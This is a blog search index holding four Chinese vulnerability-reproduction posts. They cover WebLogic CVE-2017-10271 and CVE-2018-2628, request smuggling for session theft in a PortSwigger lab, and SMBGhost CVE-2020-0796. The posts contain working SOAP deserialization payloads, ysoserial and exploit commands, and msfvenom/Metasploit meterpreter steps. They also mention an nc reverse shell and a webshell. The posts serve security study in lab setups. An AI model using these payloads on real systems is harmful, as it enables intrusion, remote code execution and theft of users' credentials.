<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Weblogic &lt; 10.3.6 &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞（CVE-2017-10271）</title>
      <link href="/2020/07/30/aricle4/"/>
      <url>/2020/07/30/aricle4/</url>
      
        <content type="html"><![CDATA[<p>1.漏洞介绍<br>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><p>2.漏洞环境<br> 通过vulhub进行搭建，找到我们要复现的漏洞的文件夹  docker-compose up -d 如图就搭建好了<br> <img src="https://img-blog.csdnimg.cn/20200804161627803.jpg" alt><br> <img src="https://img-blog.csdnimg.cn/20200811175220839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br><img src="https://img-blog.csdnimg.cn/20200811175232387.png" alt></p><p>3.漏洞复现<br>方法一：<br>1.直接发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）</p><pre class=" language-python"><code class="language-python">POST <span class="token operator">/</span>wls<span class="token operator">-</span>wsat<span class="token operator">/</span>CoordinatorPortType HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> your<span class="token operator">-</span>ip<span class="token punctuation">:</span><span class="token number">7001</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> enUser<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE <span class="token number">9.0</span><span class="token punctuation">;</span> Windows NT <span class="token number">6.1</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> Trident<span class="token operator">/</span><span class="token number">5.0</span><span class="token punctuation">)</span>Connection<span class="token punctuation">:</span> closeContent<span class="token operator">-</span>Type<span class="token punctuation">:</span> text<span class="token operator">/</span>xmlContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">638</span><span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Envelope xmlns<span class="token punctuation">:</span>soapenv<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Header<span class="token operator">></span>    <span class="token operator">&lt;</span>work<span class="token punctuation">:</span>WorkContext xmlns<span class="token punctuation">:</span>work<span class="token operator">=</span><span class="token string">"http://bea.com/2004/06/soap/workarea/"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>java<span class="token operator">></span><span class="token operator">&lt;</span>java version<span class="token operator">=</span><span class="token string">"1.4.0"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"java.beans.XMLDecoder"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>object <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"java.io.PrintWriter"</span><span class="token operator">></span>     <span class="token operator">&lt;</span>string<span class="token operator">></span>servers<span class="token operator">/</span>AdminServer<span class="token operator">/</span>tmp<span class="token operator">/</span>_WL_internal<span class="token operator">/</span>bea_wls_internal<span class="token operator">/</span>9j4dqk<span class="token operator">/</span>war<span class="token operator">/</span>test<span class="token punctuation">.</span>jsp<span class="token operator">&lt;</span><span class="token operator">/</span>string<span class="token operator">></span>    <span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"println"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">%</span> out<span class="token punctuation">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span>    <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>string<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>void<span class="token operator">></span>    <span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"close"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>object<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>java<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>java<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>work<span class="token punctuation">:</span>WorkContext<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>soapenv<span class="token punctuation">:</span>Header<span class="token operator">></span>    <span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Body<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>soapenv<span class="token punctuation">:</span>Envelope<span class="token operator">></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200811175248587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>2.用nc监听我们数据包中设置的端口 nc -l -p 21,当数据包发送成功会发现我们收到一个shell。<br><img src="https://img-blog.csdnimg.cn/20200804161929275.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br> 3.另一种方法，我们同样可以发包去写一个带有一句话木马文件getshell。</p><pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Envelope xmlns<span class="token punctuation">:</span>soapenv<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Header<span class="token operator">></span>    <span class="token operator">&lt;</span>work<span class="token punctuation">:</span>WorkContext xmlns<span class="token punctuation">:</span>work<span class="token operator">=</span><span class="token string">"http://bea.com/2004/06/soap/workarea/"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>java<span class="token operator">></span><span class="token operator">&lt;</span>java version<span class="token operator">=</span><span class="token string">"1.4.0"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"java.beans.XMLDecoder"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>object <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"java.io.PrintWriter"</span><span class="token operator">></span>     <span class="token operator">&lt;</span>string<span class="token operator">></span>servers<span class="token operator">/</span>AdminServer<span class="token operator">/</span>tmp<span class="token operator">/</span>_WL_internal<span class="token operator">/</span>bea_wls_internal<span class="token operator">/</span>9j4dqk<span class="token operator">/</span>war<span class="token operator">/</span>test<span class="token punctuation">.</span>jsp<span class="token operator">&lt;</span><span class="token operator">/</span>string<span class="token operator">></span>    <span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"println"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">%</span> out<span class="token punctuation">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"CVE-2017-10271-"</span><span class="token operator">+</span><span class="token punctuation">{</span>date<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span>    <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>string<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>void<span class="token operator">></span>    <span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"close"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>object<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>java<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>java<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>work<span class="token punctuation">:</span>WorkContext<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>soapenv<span class="token punctuation">:</span>Header<span class="token operator">></span>    <span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Body<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>soapenv<span class="token punctuation">:</span>Envelope<span class="token operator">></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200811175248587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt>4.为了演示这里我写了一个test.jsp 内容写了test发包访问目标网站，成功输出内容。<br><img src="https://img-blog.csdnimg.cn/20200811175318429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</title>
      <link href="/2020/07/28/article3/"/>
      <url>/2020/07/28/article3/</url>
      
        <content type="html"><![CDATA[<p>漏洞介绍</p><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p><p>漏洞复现<br>我这里是直接用vulhub搭建环境的官网：<a href="https://vulhub.org/，使用方法很简单直接git" target="_blank" rel="noopener">https://vulhub.org/，使用方法很简单直接git</a> clone <a href="https://github.com/vulhub/vulhub.git" target="_blank" rel="noopener">https://github.com/vulhub/vulhub.git</a> 就可以了，之后到下载的文件夹找到我们要复现的漏洞的文件夹  docker-compose up -d 如图就搭建好了<br><img src="https://img-blog.csdnimg.cn/20200811171842221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>访问一下your-ip:7001/console，这里会自动进行一些环境部署，出现登录界面就是搭建完成了。<br><img src="https://img-blog.csdnimg.cn/20200811171852860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>漏洞攻击</p><p>java反序列化漏洞需要用到ysoserial<br><a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" target="_blank" rel="noopener">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p><pre class=" language-python"><code class="language-python">用法：java <span class="token operator">-</span>cp ysoserial<span class="token number">-0.0</span><span class="token punctuation">.</span><span class="token number">6</span><span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>BETA<span class="token operator">-</span>all<span class="token punctuation">.</span>jar ysoserial<span class="token punctuation">.</span>exploit<span class="token punctuation">.</span>JRMPListener <span class="token punctuation">[</span>listen port<span class="token punctuation">]</span> CommonsCollections1 <span class="token punctuation">[</span>command<span class="token punctuation">]</span></code></pre><p>这里我们主要填一下想要用的端口[listen port]和‘命令’就可以了。<br>exp:是exploit-db里的脚本，向目标Weblogic（<a href="http://your-ip:7001）发送数据包：">http://your-ip:7001）发送数据包：</a><br><a href="https://www.exploit-db.com/exploits/44553" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44553</a></p><pre class=" language-python"><code class="language-python">主要用法：python exploit<span class="token punctuation">.</span>py  <span class="token punctuation">[</span>目标 ip<span class="token punctuation">]</span>  <span class="token punctuation">[</span>目标 port<span class="token punctuation">]</span>  <span class="token punctuation">[</span>path to ysoserial<span class="token punctuation">]</span>  <span class="token punctuation">[</span>JRMPListener ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>JRMPListener port<span class="token punctuation">]</span> <span class="token punctuation">[</span>JRMPClient<span class="token punctuation">]</span></code></pre><p>RMPListener ip也就是本机ip，JRMPListener port是我们使用ysoseral命令时的设定的端口，接下来我用实例复现<br>有了工具我们就可以直接攻击了。</p><pre class=" language-python"><code class="language-python">java <span class="token operator">-</span>cp ysoserial<span class="token operator">-</span>master<span class="token number">-30099844c6</span><span class="token operator">-</span><span class="token number">1.</span>jar ysoserial<span class="token punctuation">.</span>exploit<span class="token punctuation">.</span>JRMPListener <span class="token number">4444</span> CommonsCollections1 <span class="token string">'touch /opt/1.txt'</span></code></pre><p>1.在Ubuntu主机上运行JRMPListener开启端口监听。使得触发漏洞后weblogic所在服务器可以远程调用执行特定的程序。<br><img src="https://img-blog.csdnimg.cn/20200802183749261.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>2.用exp进行攻击</p><pre class=" language-python"><code class="language-python">python CVE<span class="token number">-2018</span><span class="token operator">-</span><span class="token number">2628</span>\<span class="token punctuation">(</span>exploit\<span class="token punctuation">)</span><span class="token punctuation">.</span>py <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">127.136</span> <span class="token number">7001</span>  ysoserial<span class="token operator">-</span>master<span class="token number">-30099844c6</span><span class="token operator">-</span><span class="token number">1.</span>jar <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">127.136</span> <span class="token number">4444</span> JRMPClient</code></pre><p><img src="https://img-blog.csdnimg.cn/20200802183828313.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>3.我们在docker看一下是否成功了<br>先docker ps一下<br><img src="https://img-blog.csdnimg.cn/2020080218385029.jpg" alt><br>docker exec -it f72fee23afa1 /bin/bash<br>~/Oracle/Middleware# cd /opt<br>/opt# ls 1.txt（我们成功用命令创建的文件）<br><img src="https://img-blog.csdnimg.cn/20200802183910197.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Request Smuggling进行账户劫持</title>
      <link href="/2020/07/24/article2/"/>
      <url>/2020/07/24/article2/</url>
      
        <content type="html"><![CDATA[<p>什么是Request Smuggling</p><p> 简而言之就是一种模糊的请求，当我们向代理服务器发送http请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个http请求，然后将其转发给了后端，但后端服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那些，就算是走私请求，当该部分对正常用户造成了影响之后，就实现了HTTP走私攻击。</p><p>在默认情况下，HTTP协议中每个传输层只能承载一个HTTP请求和响应，浏览器收到上一个请求响应后，才能开始下一个请求。<br>这里简单介绍下Transfer-Encoding这是一个请求包通用头域，前后端往往对于Transfer-Encoding和我们常用的Content-Length优先级不同容易造成漏洞。<br>Transfer-Encoding一般被人应用于分块传输绕WAF，但今天我主要想说说另一种攻击手法利用Request Smuggling进行账户劫持<br>Request Smuggling账户劫持：<br>如果在我们的恶意请求之后，其他用户也进行了请求，我们可以构造POST请求将获得的数据储存并展示出来用户的请求会带上很多敏感信息如cookie,参数等。<br>这里我利用靶场进行演示：<br><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a><br>1.首先我们点击Access the lab进入环境（需要登录）<br><img src="https://img-blog.csdnimg.cn/20200730154325133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>2.打开个页面进入评论。<br><img src="https://img-blog.csdnimg.cn/20200730152620988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>3.进行抓包通过Transfer-Encoding对抓取的数据包进行拼接，之后下个用户评论时其敏感信息就会出现在评论上。<br><img src="https://img-blog.csdnimg.cn/20200730153905118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>4.将抓取的包进行拼接。<br><img src="https://img-blog.csdnimg.cn/20200730154708387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>5.成功截取用户的敏感信息。<br><img src="https://img-blog.csdnimg.cn/20200730154819814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796复现漏洞</title>
      <link href="/2020/07/23/article1/"/>
      <url>/2020/07/23/article1/</url>
      
        <content type="html"><![CDATA[<h1 id="1-漏洞介绍"><a href="#1-漏洞介绍" class="headerlink" title="1.漏洞介绍"></a>1.漏洞介绍</h1><p>1.背景：<br>微软最近宣布了SMBv3.1.1压缩机制中的一个bug。这个bug也被称为“SMBGhost”。这个错误在托管网络中有严重的影响。Windows 10版本1903和1909受到影响。<br>在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。<br>2.影响版本<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)</p><h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h1><p>环境搭建：<br>复现我用的是这个镜像</p><pre><code>ed2k://|file|cn_windows_10_business_editions_version_1903_updated_sept_2019_x64_dvd_2f5281e1.iso|5231140864|B1D5C4C401036B0B1EBA64476A95F338|/</code></pre><p><strong>1.下载扫描器检测是否存在此漏洞</strong><br><a href="https://github.com/ollypwn/SMBGhost![](https://img-blog.csdnimg.cn/20200723193843371.jpg)" target="_blank" rel="noopener">https://github.com/ollypwn/SMBGhost![](https://img-blog.csdnimg.cn/20200723193843371.jpg)</a> 2.我们开始进行远程攻击<br>注意系统安装完成后关闭防火墙要不然会ping不通，使用RCE脚本会显示socket.timeout<br>payload要正向监听<br>1.首先我们生成一个木马</p><pre class=" language-python"><code class="language-python">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>b <span class="token string">'\x00'</span> <span class="token operator">-</span>i <span class="token number">1</span> <span class="token operator">-</span>f python</code></pre><p>EXP:<br><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a><br>2.将我们生成的木马去掉buf改成USER_PAYLOAD替换exploit.py文件里里的USER_PAYLOAD<br><img src="https://img-blog.csdnimg.cn/20200723194227653.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">3.之后我们先打开msf开启监听</p><pre class=" language-python"><code class="language-python">use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler set payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcpset lport <span class="token number">4444</span>set rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">127.141</span>set lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">127.129</span>run</code></pre><p>注意这里需要设置lhost 和rhost要不然不会好使我这里卡了好久<br>4.现在我们运行脚本（可以先检查下是否ping的通）</p><pre class=" language-python"><code class="language-python">python3 exploit<span class="token punctuation">.</span>py <span class="token operator">-</span>ip <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">127.141</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200723194352545.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">5.我们看见msf自动获取到会话<br><img src="https://img-blog.csdnimg.cn/20200723194400544.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt>查看为管理员权限<br><img src="https://img-blog.csdnimg.cn/20200723194624307.jpg" alt>蓝屏攻击:<br>POC <a href="https://github.com/jiansiting/CVE-2020-0796直接运行脚本加目标ip" target="_blank" rel="noopener">https://github.com/jiansiting/CVE-2020-0796直接运行脚本加目标ip</a><br><img src="https://img-blog.csdnimg.cn/20200723194708565.jpg" alt><br><img src="https://img-blog.csdnimg.cn/2020072320203382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br><img src="https://img-blog.csdnimg.cn/20200723194832896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
